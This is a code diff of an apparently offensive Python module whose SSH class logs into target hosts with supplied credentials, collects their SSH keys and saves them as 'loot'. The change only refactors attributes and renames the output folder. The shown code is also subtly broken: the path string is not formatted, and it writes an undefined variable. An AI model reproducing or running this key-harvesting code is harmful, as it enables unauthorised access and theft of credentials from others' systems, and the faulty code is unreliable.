@@ -2,8 +2,9 @@ from hydra import Exploit
 import sys, paramiko, getpass
 
 class SSH(Exploit):
-    name = "ssh"
-    port = 22
+    def __init__(self):
+        self.name = 'ssh'
+        self.port = 22
 
     def getloot(self, ip_address, credentials):
         # try to log into ssh using credentials
@@ -21,7 +22,7 @@ class SSH(Exploit):
                 keys = get_sshkeys(self, ssh)
                 ssh.close()
                 if keys: 
-                    with open("../loot/{ip_address}_{c[0]}_sshkey.txt", "w") as text_file:
+                    with open("../data/{ip_address}_{c[0]}_sshkey.txt", "w") as text_file:
 	                    text_file.write(text)
                 return usernames
             except:
